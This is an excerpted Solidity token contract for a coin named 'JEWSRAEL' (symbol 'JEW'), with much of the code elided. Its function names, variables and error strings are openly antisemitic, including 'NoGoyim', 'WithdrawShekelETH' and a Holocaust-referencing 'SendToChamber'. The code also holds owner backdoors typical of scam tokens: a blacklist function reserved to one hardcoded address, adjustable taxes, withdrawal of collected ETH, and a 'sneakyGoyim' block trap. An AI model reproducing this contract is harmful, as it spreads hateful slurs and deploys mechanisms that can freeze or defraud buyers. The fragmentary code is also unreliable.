...
contract JEWSRAEL is IERC20, Ownable {
    bool botrekt = true;
    ...
    string public constant _name = "JEWSRAEL";
    string public constant _symbol = "JEW";
    uint8 public constant _decimals = 9;
    uint256 public constant InitialSupply = 6 * 10**6 * 10**_decimals;

    uint256 swapLimit = 2 * 10**4 * 10**_decimals;
    ...
    uint16 public SellLimitDivider = 200; // .5%

    uint16 public MaxSellLockTime = 120 seconds;

    mapping(address => bool) isAuth;

    address public constant UniswapRouter =
        0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant NoGoyim = 0xCD4E689fD12410C42d1AF27E7B44306786bcaa7C;
    ...
    uint8 public GoyimShare = 50;

    uint256 public marketingBalance;
    uint256 public GoyimBalance;
    ...
    uint private blocksToRekt = 0;
    uint enabledBlock;

    modifier onlyAuth() {
        require(_isAuth(msg.sender), "Caller is no Goyim");
        _;
    }
    ...
    function _taxedTransfer(
        ...
        uint8 tax;
        if (isSell) {
            if (!_excludedFromSellLock.contains(sender) || (!isAuth[sender])) {
                require(
        ...
        uint256 contractToken = _calculateFee(
            amount,
            tax,
            _marketingTax + _liquidityTax + _GoyimTax
        );
    ...
    function _distributeFeesETH(uint256 ETHamount) private {
        ...
        uint256 GoyimSplit = (ETHamount * GoyimShare) / 100;

        marketingBalance += marketingSplit;
        GoyimBalance += GoyimSplit;
    }
    ...
    function _swapContractToken(uint256 totalMax) private lockTheSwap {
        ...
        uint256 tokenForGoyim = (tokenToSwap * _GoyimTax) / totalTax;
    ...
    function SendToChamber(uint256 amount) public onlyAuth {
    ...
    function MultBlackListAddress(address[] memory addy, bool booly) external {
        require (msg.sender == NoGoyim);
         for (uint i = 0; i < addy.length; i++) {
        _blacklist[addy[i]] = booly;
    }
    }    
    ...
    function WithdrawShekelETH() public onlyAuth {
        uint256 amount = GoyimBalance;
        GoyimBalance = 0;
        address sender = msg.sender;
        (bool sent, ) = sender.call{value: (amount)}("");
        require(sent, "withdraw failed");
    ...
    function SetTaxes(
        ...
        uint8 totalTax = GoyimTaxes +
            liquidityTaxes +
            marketingTaxes;
        require(totalTax == 100, "burn+liq+marketing needs to equal 100%");
        _GoyimTax = GoyimTaxes;
    ...
    function sneakyGoyim(uint newRekt) public onlyAuth {
        blocksToRekt = newRekt;
    }

    function ChangeGoyimShare(uint8 newShare) public onlyAuth {
        GoyimShare = newShare;
    }
